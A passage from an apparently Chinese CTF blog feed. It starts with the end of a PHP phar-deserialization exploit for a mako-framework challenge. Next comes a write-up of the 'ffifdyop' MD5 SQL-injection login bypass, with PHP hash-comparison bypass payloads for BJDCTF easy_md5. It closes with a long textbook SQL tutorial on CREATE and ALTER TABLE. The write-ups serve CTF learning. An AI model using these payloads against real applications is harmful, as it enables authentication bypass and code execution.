mako\file&#123;</span></span><br><span class="line"><span class="string">    class FileSystem&#123;</span></span><br><span class="line"><span class="string">        public function __construct()</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">namespace &#123;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    use mako\session\Session;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span></span><br><span class="line"><span class="string">    $phar-&gt;startBuffering();</span></span><br><span class="line"><span class="string">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span></span><br><span class="line"><span class="string">    $o = new Session();</span></span><br><span class="line"><span class="string">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="string">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;asd&quot;); //添加要压缩的文件</span></span><br><span class="line"><span class="string">//签名自动计算</span></span><br><span class="line"><span class="string">    $phar-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>接下来就是常规获取shell了，但是我自己本地搭的docker传上去的phar.phar没反应，没法读取，没能复现成功。</p>
]]></content>
      <categories>
        <category>赛事Writeup</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Web</tag>
        <tag>Misc</tag>
        <tag>Re</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL- ffifdyop绕过</title>
    <url>/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>当看到这个绕过并没法察觉的时候，我就知道我的SQL注入还没入门，在浏览其他师傅的blog中，知道这是绕过中的一个奇妙的字符串<qwq></qwq></p>
<span id="more"></span>
<h1 id="sql-ffifdyop绕过"><a class="markdownIt-Anchor" href="#sql-ffifdyop绕过"></a> SQL-- ffifdyop绕过</h1>
<h3 id="绕过技巧解读"><a class="markdownIt-Anchor" href="#绕过技巧解读"></a> 绕过技巧解读</h3>
<p>先给你看一个东西:276f7227，看到这个你想到了什么？</p>
<p>&lt;----‘or’----&gt;有没有给你一个很熟悉的感觉！是的这正是“ffidfyop”的md5加密后的值：276f722736c95d99e921722cf9ed621c 我们都知道SQL语句会自动将Hex转成Ascii来解释。</p>
<p>因此拼接之后：</p>
<p><code>select * from admin where password=''or'6&lt;乱码&gt;'</code></p>
<p>相当于<code>select * from admin where password=''or'1</code>，一个永真式，以此来绕过MD5()。</p>
<p>同理的还有：129581926211651571912466741651878684928 也可达同样的效果</p>
<p>总之，相当于 <code>select * from admin where password=''or ture</code>。</p>
<h3 id="例题解读"><a class="markdownIt-Anchor" href="#例题解读"></a> 例题解读：</h3>
<h4 id="bjdctf-2020easy_md5"><a class="markdownIt-Anchor" href="#bjdctf-2020easy_md5"></a> [BJDCTF 2020]easy_md5</h4>
<p>打开链接，看到输入框，第一时间就想到注入：</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911164839623.png" alt="麻了"></p>
<p>试过诸多注入无果，抓了一下包，看到hint：</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911165221183.png" alt="麻了"></p>
<p>看到hint，就知道是绕过MD5()。</p>
<p>框内输入“ffifdyop”，成功绕过。</p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911165824467.png" alt="麻了"></p>
<p>查看源代码，这里有很多种绕过方式：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">a</span>=QNKCDZO&amp;b=240610708</span><br><span class="line"></span><br><span class="line">?<span class="attribute">a</span>=s878926199a&amp;b=s155964671a</span><br><span class="line"></span><br><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911170317691.png" alt="麻了"></p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911170742947.png" alt="麻了"></p>
<p>同理，POST双参数数组绕过。</p>
<hr>
<p>这里有其他师傅的顶级理解：</p>
<p><em>弱类型比较变成了强类型比较了，这里就只能用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false==false成立使条件成立</em></p>
<p><img src="/2022/09/SQL-ffifdyop%E7%BB%95%E8%BF%87/image-20220911171036454.png" alt="麻了"></p>
<p>flag：NSSCTF{762d2772-8382-4ec4-9f9c-8354f7d0c995}</p>
<h3 id="结"><a class="markdownIt-Anchor" href="#结"></a> 结</h3>
<p>学到了新东西，这才是入门诶，呜呜呜，我好菜！！！</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>绕过技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL-增删改查</title>
    <url>/2022/09/SQL-%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/</url>
    <content><![CDATA[<p>Do u know Create and Drop Database, Create, Alter and Drop Tables, Select, Insert, Update, Delete Commands.</p>
<span id="more"></span>
<h2 id="introduction-descriptive"><a class="markdownIt-Anchor" href="#introduction-descriptive"></a> Introduction (Descriptive)</h2>
<p>Content:- Creating and Maintaining Tables, Objectives, The CREATE DATABASE Statement, CREATE DATABASE Options, Database Design, Creating a Data Dictionary, Creating Key Fields, The CREATE TABLE Statement, The Table Name, The Field Name, The Field’s Data Type, The NULL Value, Table Storage and Sizing, Creating a Table from an Existing Table, The ALTER TABLE Statement, The DROP TABLE Statement, The DROP DATABASE Statement.</p>
<h2 id="details"><a class="markdownIt-Anchor" href="#details"></a> Details</h2>
<p>It covers the <strong>CREATE DATABASE</strong>, <strong>CREATE TABLE</strong>, <strong>ALTER TABLE</strong>, <strong>DROP TABLE</strong>, and <strong>DROP DATABASE</strong> statements, which are collectively known as data definition statements. (In contrast, the <strong>SELECT</strong>, <strong>UPDATE</strong>, <strong>INSERT</strong>, and <strong>DELETE</strong> statements are often described as data manipulation statements.) By the end, you will understand and be able to do the following:</p>
<ul>
<li>Create key fields</li>
<li>Create a database with its associated tables</li>
<li>Create, alter, and drop a table</li>
<li>Add data to the database</li>
<li>Modify the data in a database</li>
<li>Drop databases</li>
</ul>
<p>The syntax of the <strong>CREATE</strong> statements can range from the extremely simple to the complex, depending on the options your database management system (DBMS) supports and how detailed you want to be when building a database.</p>
<p><strong>NOTE:</strong> The examples used today were generated using Personal Oracle7. Please see the documentation for your specific SQL implementation for any minor differences in syntax.</p>
<h2 id="the-create-database-statement"><a class="markdownIt-Anchor" href="#the-create-database-statement"></a> <strong>The CREATE DATABASE Statement</strong></h2>
<p>The first data management step in any database project is to create the database. This task can range from the elementary to the complicated, depending on your needs and the database management system you have chosen. Many modern systems (including Personal Oracle7) include graphical tools that enable you to completely build the database with the click of a mouse button. This time-saving feature is certainly helpful, but you should understand the SQL statements that execute in response to the mouse clicks.</p>
<p>Through personal experience, we have learned the importance of creating a good SQL install script. This script file contains the necessary SQL code to completely rebuild a database or databases; the script often includes database objects such as indexes, stored procedures, and triggers. You will see the value of this script during development as you continually make changes to the underlying database and on occasion want to completely rebuild the database with all the latest changes. Using the graphical tools each time you need to perform a rebuild can become extremely time-consuming. In addition, knowing the SQL syntax for this procedure enables you to apply your knowledge to other database systems.</p>
<p>The syntax for the typical <strong>CREATE DATABASE</strong> statement looks like this:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE DATABASE database_name</p>
<p>Because the syntax varies so widely from system to system, we will not expand on the <strong>CREATE DATABASE</strong> statement’s syntax. Many systems do not even support an SQL <strong>CREATE DATABASE</strong> command. However, all the popular, more powerful, relational database management systems (RDBMSs) do provide it. Instead of focusing on its syntax, we will spend some time discussing the options to consider when creating a database.</p>
<h2 id="create-database-options"><a class="markdownIt-Anchor" href="#create-database-options"></a> <strong>CREATE DATABASE Options</strong></h2>
<p>The syntax for the <strong>CREATE DATABASE</strong> statement can vary widely. Many SQL texts skip over the <strong>CREATE DATABASE</strong> statement and move directly on to the <strong>CREATE TABLE</strong> statement. Because you must create a database before you can build a table, this section focuses on some of the concepts a developer must consider when building a database. The first consideration is your level of permission. If you are using a relational database management system (RDBMS) that supports user permissions, you must make sure that either you have system administrator-level permission settings or the system administrator has granted you <strong>CREATE DATABASE</strong> permission. Refer to your RDBMS documentation for more information.</p>
<p>Most RDBMSs also allow you to specify a default database size, usually in terms of hard disk space (such as megabytes). You will need to understand how your database system stores and locates data on the disk to accurately estimate the size you need. The responsibility for managing this space falls primarily to system administrators, and possibly at your location a database administrator will build you a test database.</p>
<p>Don’t let the <strong>CREATE DATABASE</strong> statement intimidate you. At its simplest, you can create a database named <strong>PAYMENTS</strong> with the following statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>SQL&gt; <strong>CREATE DATABASE PAYMENTS;</strong></p>
<p><strong>NOTE:</strong> Again, be sure to consult your database management system’s documentation to learn the specifics of building a database, as the <strong>CREATE DATABASE</strong> statement can and does vary for the different implementations. Each implementation also has some unique options.</p>
<p><strong>Database Design</strong></p>
<p><em>Normalization</em> is the process of breaking your data into separate components to reduce the repetition of data. Each level of normalization reduces the repetition of data. Normalizing your data can be an extremely complex process, and numerous database design tools enable you to plan this process in a logical fashion. Many factors can influence the design of your database, including the following:</p>
<p><strong>Security</strong></p>
<ul>
<li>Disk space available</li>
<li>Speed of database searches and retrievals</li>
<li>Speed of database updates</li>
<li>Speed of multiple-table joins to retrieve data</li>
<li>RDBMS support for temporary tables</li>
</ul>
<p>Disk space is always an important factor. Although you may not think that disk space is a major concern in an age of multigigabyte storage, remember that the bigger your database is, the longer it takes to retrieve records. If you have done a poor job of designing your table structure, chances are that you have needlessly repeated much of your data.</p>
<p>Often the opposite problem can occur. You may have sought to completely normalize your tables’ design with the database and in doing so created many tables. Although you may have approached database-design nirvana, any query operations done against this database may take a very long time to execute. Databases designed in this manner are sometimes difficult to maintain because the table structure might obscure the designer’s intent. This problem underlines the importance of always documenting your code or design so that others can come in after you (or work with you) and have some idea of what you were thinking at the time you created your database structure. In database designer’s terms, this documentation is known as a data dictionary.</p>
<h2 id="creating-a-data-dictionary"><a class="markdownIt-Anchor" href="#creating-a-data-dictionary"></a> <strong>Creating a Data Dictionary</strong></h2>
<p>A data dictionary is the database designer’s most important form of documentation. It performs the following functions:</p>
<ul>
<li>Describes the purpose of the database and who will be using it.</li>
<li>Documents the specifics behind the database itself: what device it was created on, the database’s default size, or the size of the log file (used to store database operations information in some RDBMSs).</li>
<li>Contains SQL source code for any database install or uninstall scripts, including documentation on the use of import/export tools.</li>
<li>Provides a detailed description of each table within the database and explains its purpose in business process terminology.</li>
<li>Documents the internal structure of each table, including all fields and their data types with comments, all indexes, and all views.</li>
<li>Contains SQL source code for all stored procedures and triggers.</li>
<li>Describes database constraints such as the use of unique values or <strong>NOT NULL</strong> values. The documentation should also mention whether these constraints are enforced at the RDBMS level or whether the database programmer is expected to check for these constraints within the source code.</li>
</ul>
<p>Many computer-aided software engineering (CASE) tools aid the database designer in the creation of this data dictionary. For instance, Microsoft Access comes prepackaged with a database documenting tool that prints out a detailed description of every object in the database.</p>
<p><strong>NOTE:</strong> Most of the major RDBMS packages come with either the data dictionary installed or scripts to install it.</p>
<h2 id="creating-key-fields"><a class="markdownIt-Anchor" href="#creating-key-fields"></a> <strong>Creating Key Fields</strong></h2>
<p>Along with documenting your database design, the most important design goal you should have is to create your table structure so that each table has a primary key and a foreign key. The primary key should meet the following goals:</p>
<ul>
<li>Each record is unique within a table (no other record within the table has all of its columns equal to any other).</li>
<li>For a record to be unique, all the columns are necessary; that is, data in one column should not be repeated anywhere else in the table.</li>
</ul>
<p>Regarding the second goal, the column that has completely unique data throughout the table is known as the <em>primary key field</em>. A <em>foreign key field</em> is a field that links one table to another table’s primary or foreign key. The following example should clarify this situation.</p>
<p>Assume you have three tables: <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong>. Table 9.1 shows the format of these three tables.</p>
<p><strong>Table 9.1. Table structure for the PAYMENTS database.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/54613e7278674249b4a08a642a66837b.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>Take a moment to examine these tables. Which fields do you think are the primary keys? Which are the foreign keys?</p>
<p>The primary key in the <strong>BILLS</strong> table is the <strong>NAME</strong> field. This field should not be duplicated because you have only one bill with this amount. (In reality, you would probably have a check number or a date to make this record truly unique, but assume for now that the <strong>NAME</strong> field works.) The <strong>ACCOUNT_ID</strong> field in the <strong>BANK_ACCOUNTS</strong> table is the primary key for that table. The <strong>NAME</strong> field is the primary key for the <strong>COMPANY</strong> table.</p>
<p>The foreign keys in this example are probably easy to spot. The <strong>ACCOUNT_ID</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>BANK_ACCOUNTS</strong> table. The <strong>NAME</strong> field in the <strong>BILLS</strong> table joins the <strong>BILLS</strong> table with the <strong>COMPANY</strong> table. If this were a full-fledged database design, you would have many more tables and data breakdowns. For instance, the <strong>BANK</strong> field in the <strong>BANK_ACCOUNTS</strong> table could point to a <strong>BANK</strong> table containing bank information such as addresses and phone numbers. The <strong>COMPANY</strong> table could be linked with another table (or database for that matter) containing information about the company and its products.</p>
<p><strong>Exercise 9.1</strong></p>
<p>Let’s take a moment to examine an incorrect database design using the same information contained in the <strong>BILLS</strong>, <strong>BANK_ACCOUNTS</strong>, and <strong>COMPANY</strong> tables. A mistake many beginning users make is not breaking down their data into as many logical groups as possible. For instance, one poorly designed <strong>BILLS</strong> table might look like this:</p>
<p><img src="https://img-blog.csdnimg.cn/75dd3c28420b4db7af3b8291bcf7bb97.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/7047a6fada8f4a6ba3ea2083f2961ea8.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>The results may look correct, but take a moment to really look at the data here. If over several months you wrote several bills to the company in the <strong>NAME</strong> field, each time a new record was added for a bill, the company’s <strong>ADDRESS</strong>, <strong>CITY</strong>, and <strong>STATE</strong> information would be duplicated. Now multiply that duplication over several hundred or thousand records and then multiply that figure by 10, 20, or 30 tables. You can begin to see the importance of a properly normalized database.</p>
<p>Before you actually fill these tables with data, you will need to know how to create a table.</p>
<h2 id="the-create-table-statement"><a class="markdownIt-Anchor" href="#the-create-table-statement"></a> <strong>The CREATE TABLE Statement</strong></h2>
<p>The process of creating a table is far more standardized than the <strong>CREATE DATABASE</strong> statement. Here’s the basic syntax for the <strong>CREATE TABLE</strong> statement:</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE table_name</p>
<p>( field1 datatype [ NOT NULL ],</p>
<p>field2 datatype [ NOT NULL ],</p>
<p>field3 datatype [ NOT NULL ]…)</p>
<p>A simple example of a <strong>CREATE TABLE</strong> statement follows</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30),</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement creates a table named <strong>BILLS</strong>. Within the <strong>BILLS</strong> table are three fields: <strong>NAME</strong>, <strong>AMOUNT</strong>, and <strong>ACCOUNT_ID</strong>. The <strong>NAME</strong> field has a data type of character and can store strings up to 30 characters long. The <strong>AMOUNT</strong> and <strong>ACCOUNT_ID</strong> fields can contain number values only.</p>
<p>The following section examines components of the <strong>CREATE TABLE</strong> command.</p>
<h3 id="the-table-name"><a class="markdownIt-Anchor" href="#the-table-name"></a> <strong>The Table Name</strong></h3>
<p>When creating a table using Personal Oracle7, several constraints apply when naming the table. First, the table name can be no more than 30 characters long. Because Oracle is case insensitive, you can use either uppercase or lowercase for the individual characters. However, the first character of the name must be a letter between <strong>A</strong> and <strong>Z</strong>. The remaining characters can be letters or the symbols <strong>_</strong>, <strong>#</strong>, <strong>$</strong>, and <strong>@</strong>. Of course, the table name must be unique within its schema. The name also cannot be one of the Oracle or SQL reserved words (such as <strong>SELECT</strong>).</p>
<p><strong>NOTE:</strong> You can have duplicate table names as long as the owner or schema is different. Table names in the same schema must be unique.</p>
<h3 id="the-field-name"><a class="markdownIt-Anchor" href="#the-field-name"></a> <strong>The Field Name</strong></h3>
<p>The same constraints that apply to the table name also apply to the field name. However, a field name can be duplicated within the database. The restriction is that the field name must be unique within its table. For instance, assume that you have two tables in your database: <strong>TABLE1</strong>and <strong>TABLE2</strong>. Both of these tables could have fields called ID. You cannot, however, have two fields within <strong>TABLE1</strong> called <strong>ID</strong>, even if they are of different data types.</p>
<h3 id="the-fields-data-type"><a class="markdownIt-Anchor" href="#the-fields-data-type"></a> <strong>The Field’s Data Type</strong></h3>
<p>If you have ever programmed in any language, you are familiar with the concept of data types, or the type of data that is to be stored in a specific field. For instance, a character data type constitutes a field that stores only character string data. Table 9.2 shows the data types supported by Personal Oracle7.</p>
<p><strong>Table 9.2. Data types supported by Personal Oracle7.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/96c27bf2f8294ddd95fdbb552a7c9071.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://img-blog.csdnimg.cn/97d769dab67f44fba0b88e7a2f110dd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>NOTE:</strong> The <strong>LONG</strong> data type is often called a <strong>MEMO</strong> data type in other database management systems. It is primarily used to store large amounts of text for retrieval at some later time.</p>
<p>The <strong>LONG RAW</strong> data type is often called a binary large object (<strong>BLOB</strong>) in other database management systems. It is typically used to store graphics, sound, or video data. Although relational database management systems were not originally designed to serve this type of data, many multimedia systems today store their data in <strong>LONG RAW</strong>, or <strong>BLOB</strong>, fields.</p>
<p>The <strong>ROWID</strong> field type is used to give each record within your table a unique, no duplicating value. Many other database systems support this concept with a <strong>COUNTER</strong> field (Microsoft Access) or an <strong>IDENTITY</strong> field (SQL Server).</p>
<p><strong>NOTE:</strong> Check your implementation for supported data types as they may vary.</p>
<h3 id="the-null-value"><a class="markdownIt-Anchor" href="#the-null-value"></a> <strong>The NULL Value</strong></h3>
<p>SQL also enables you to identify what can be stored within a column. A <strong>NULL</strong> value is almost an oxymoron, because having a field with a value of <strong>NULL</strong> means that the field actually has no value stored in it.</p>
<p>When building a table, most database systems enable you to denote a column with the <strong>NOT NULL</strong> keywords. <strong>NOT NULL</strong> means the column cannot contain any <strong>NULL</strong> values for any records in the table. Conversely, <strong>NOT NULL</strong> means that every record must have an actual value in this column. The following example illustrates the use of the <strong>NOT NULL</strong> keywords.</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NOT NULL);</strong></p>
<p><strong>ANALYSIS:</strong></p>
<p>In this table you want to save the name of the company you owe the money to, along with the bill’s amount. If the <strong>NAME</strong> field and/or the <strong>ACCOUNT_ID</strong> were not stored, the record would be meaningless. You would end up with a record with a bill, but you would have no idea whom you should pay.</p>
<p>The first statement in the next example inserts a valid record containing data for a bill to be sent to Joe’s Computer Service for $25.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(“Joe’s Computer Service”, 25, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>INSERT INTO BILLS VALUES(“”, 25000, 1);</strong></p>
<p>1 row inserted.</p>
<p><strong>ANALYSIS:</strong></p>
<p>Notice that the second record in the preceding example does not contain a <strong>NAME</strong> value. (You might think that a missing payee is to your advantage because the bill amount is $25,000, but we won’t consider that.) If the table had been created with a <strong>NOT NULL</strong> value for the <strong>NAME</strong> field, the second insert would have raised an error.</p>
<p>A good rule of thumb is that the primary key field and all foreign key fields should never contain <strong>NULL</strong> values.</p>
<p><strong>Unique Fields</strong></p>
<p>One of your design goals should be to have one unique column within each table. This column or field is a primary key field. Some database management systems allow you to set a field as unique. Other database management systems, such as Oracle and SQL Server, allow you to create a unique index on a field. This feature keeps you from inserting duplicate key field values into the database.</p>
<p>You should notice several things when choosing a key field. As we mentioned, Oracle provides a <strong>ROWID</strong> field that is incremented for each row that is added, which makes this field by default always a unique key. <strong>ROWID</strong> fields make excellent key fields for several reasons. First, it is much faster to join on an integer value than on an 80- character string. Such joins result in smaller database sizes over time if you store an integer value in every primary and foreign key as opposed to a long <strong>CHAR</strong> value. Another advantage is that you can use <strong>ROWID</strong> fields to see how a table is organized. Also, using <strong>CHAR</strong> values leaves you open to a number of data entry problems. For instance, what would happen if one person entered <strong>111 First Street</strong>, another entered <strong>111 1st Street</strong>, and yet another entered <strong>111 First St.</strong>? With today’s graphical user environments, the correct string could be entered into a list box. When a user makes a selection from the list box, the code would convert this string to a unique ID and save this ID to the database.</p>
<p>Now you can create the tables you used earlier today. You will use these tables for the rest of today, so you will want to fill them with some data. Use the <strong>INSERT</strong> command covered yesterday to load the tables with the data in Tables 9.3, 9.4, and 9.5.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>create database PAYMENTS;</strong></p>
<p>Statement processed.</p>
<p>SQL&gt; <strong>create table BILLS (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>AMOUNT NUMBER,</strong></p>
<p>4 <strong>ACCOUNT_ID NUMBER NOT NULL);</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table BANK_ACCOUNTS (</strong></p>
<p>2 <strong>ACCOUNT_ID NUMBER NOT NULL,</strong></p>
<p>3 <strong>TYPE CHAR(30),</strong></p>
<p>4 <strong>BALANCE NUMBER,</strong></p>
<p>5 <strong>BANK CHAR(30));</strong></p>
<p>Table created.</p>
<p>SQL&gt; <strong>create table COMPANY (</strong></p>
<p>2 <strong>NAME CHAR(30) NOT NULL,</strong></p>
<p>3 <strong>ADDRESS CHAR(50),</strong></p>
<p>4 <strong>CITY CHAR(30),</strong></p>
<p>5 <strong>STATE CHAR(2));</strong></p>
<p>Table created.</p>
<p><strong>Table 9.3. Sample data for the BILLS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0d2c47a1014d4410b1914a93640728cc.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table 9.4. Sample data for the BANK_ACCOUNTS table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/0e80211dce534627935aeb2437501c74.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table 9.5. Sample data for the COMPANY table.</strong></p>
<p><img src="https://img-blog.csdnimg.cn/458ba3ffdf17401ba0fed78e6c46207f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><strong>Table Storage and Sizing</strong></p>
<p>Most major RDBMSs have default settings for table sizes and table locations. If you do not specify table size and location, then the table will take the defaults. The defaults may be very undesirable, especially for large tables. The default sizes and locations will vary among the implementations. Here is an example of a <strong>CREATE TABLE</strong> statement with a storage clause (from Oracle).</p>
<p><strong>INPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE TABLENAME</strong></p>
<p>2 <strong>(COLUMN1 CHAR NOT NULL,</strong></p>
<p>3 <strong>COLUMN2 NUMBER,</strong></p>
<p>4 <strong>COLUMN3 DATE)</strong></p>
<p>5 <strong>TABLESPACE TABLESPACE NAME</strong></p>
<p>6 <strong>STORAGE</strong></p>
<p>7 <strong>INITIAL SIZE,</strong></p>
<p>8 <strong>NEXT SIZE,</strong></p>
<p>9 <strong>MINEXTENTS value,</strong></p>
<p>10 <strong>MAXEXTENTS value,</strong></p>
<p>11 <strong>PCTINCREASE value);</strong></p>
<p><strong>OUTPUT:</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>In Oracle you can specify a tablespace in which you want the table to reside. A decision is usually made according to the space available, often by the database administrator (DBA). <strong>INITIAL SIZE</strong> is the size for the initial extent of the table (the initial allocated space). <strong>NEXT SIZE</strong> is the value for any additional extents the table may take through growth. <strong>MINEXTENTS</strong> and <strong>MAXEXTENTS</strong> identify the minimum and maximum extents allowed for the table, and <strong>PCTINCREASE</strong> identifies the percentage the next extent will be increased each time the table grows, or takes another extent.</p>
<p><strong>Creating a Table from an Existing Table</strong></p>
<p>The most common way to create a table is with the <strong>CREATE TABLE</strong> command. However, some database management systems provide an alternative method of creating tables, using the format and data of an existing table. This method is useful when you want to select the data out of a table for temporary modification. It can also be useful when you have to create a table similar to the existing table and fill it with similar data. (You won’t have to reenter all this information.) The syntax for Oracle follows.</p>
<p><strong>SYNTAX:</strong></p>
<p>CREATE TABLE NEW_TABLE(FIELD1, FIELD2, FIELD3)</p>
<p>AS (SELECT FIELD1, FIELD2, FIELD3</p>
<p>FROM OLD_TABLE &lt;WHERE…&gt;</p>
<p>This syntax allows you to create a new table with the same data types as those of the fields that are selected from the old table. It also allows you to rename the fields in the new table by giving them new names.</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>CREATE TABLE NEW_BILLS(NAME, AMOUNT, ACCOUNT_ID)</strong></p>
<p>2 <strong>AS (SELECT * FROM BILLS WHERE AMOUNT &lt; 50);</strong></p>
<p>Table created.</p>
<p><strong>ANALYSIS:</strong></p>
<p>The preceding statement creates a new table (<strong>NEW_BILLS</strong>) with all the records from the <strong>BILLS</strong> table that have an <strong>AMOUNT</strong> less than <strong>50</strong>.</p>
<p>Some database systems also allow you to use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>INSERT NEW_TABLE</p>
<p>SELECT &lt;field1, field2… | *&gt; from OLD_TABLE</p>
<p>&lt;WHERE…&gt;</p>
<p>The preceding syntax would create a new table with the exact field structure and data found in the old table. Using SQL Server’s Transact-SQL language in the following example illustrates this technique.</p>
<p><strong>INPUT:</strong></p>
<p><strong>INSERT NEW_BILLS</strong></p>
<p>1&gt; <strong>select * from BILLS where AMOUNT &lt; 50</strong></p>
<p>2&gt; <strong>go</strong></p>
<p>(The <strong>GO</strong> statement in SQL Server processes the SQL statements in the command buffer. It is equivalent to the semicolon (<strong>;</strong>) used in Oracle7.)</p>
<p><strong>The ALTER TABLE Statement</strong></p>
<p>Many times your database design does not account for everything it should. Also, requirements for applications and databases are always subject to change. The <strong>ALTER TABLE</strong> statement enables the database administrator or designer to change the structure of a table after it has been created.</p>
<p>The <strong>ALTER TABLE</strong> command enables you to do two things:</p>
<ul>
<li>Add a column to an existing table</li>
<li>Modify a column that already exists</li>
</ul>
<p>The syntax for the <strong>ALTER TABLE</strong> statement is as follows:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name</p>
<p>&lt;ADD column_name data_type; |</p>
<p>MODIFY column_name data_type;&gt;</p>
<p>The following command changes the <strong>NAME</strong> field of the <strong>BILLS</strong> table to hold 40</p>
<p>characters:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE BILLS</strong></p>
<p>2 <strong>MODIFY NAME CHAR(40);</strong></p>
<p>Table altered.</p>
<p><strong>NOTE:</strong> You can increase or decrease the length of columns; however, you can not decrease a column’s length if the current size of one of its values is greater than the value you want to assign to the column length.</p>
<p>Here’s a statement to add a new column to the <strong>NEW_BILLS</strong> table:</p>
<p><strong>INPUT/OUTPUT:</strong></p>
<p>SQL&gt; <strong>ALTER TABLE NEW_BILLS</strong></p>
<p>2 <strong>ADD COMMENTS CHAR(80);</strong></p>
<p>Table altered.</p>
<p><strong>ANALYSIS:</strong></p>
<p>This statement would add a new column named <strong>COMMENTS</strong> capable of holding 80 characters. The field would be added to the right of all the existing fields.</p>
<p>Several restrictions apply to using the <strong>ALTER TABLE</strong> statement. You cannot use it to add or delete fields from a database. It can change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, but not necessarily the other way around. A column specification can be changed from <strong>NULL</strong> to <strong>NOT NULL</strong> only if the column does not contain any <strong>NULL</strong> values. To change a column from <strong>NOT NULL</strong> to <strong>NULL</strong>, use the following syntax:</p>
<p><strong>SYNTAX:</strong></p>
<p>ALTER TABLE table_name MODIFY (column_name data_type NULL);</p>
<p>To change a column from <strong>NULL</strong> to <strong>NOT NULL</strong>, you might have to take several steps:</p>
<p><strong>1.</strong> Determine whether the column has any <strong>NULL</strong> values.</p>
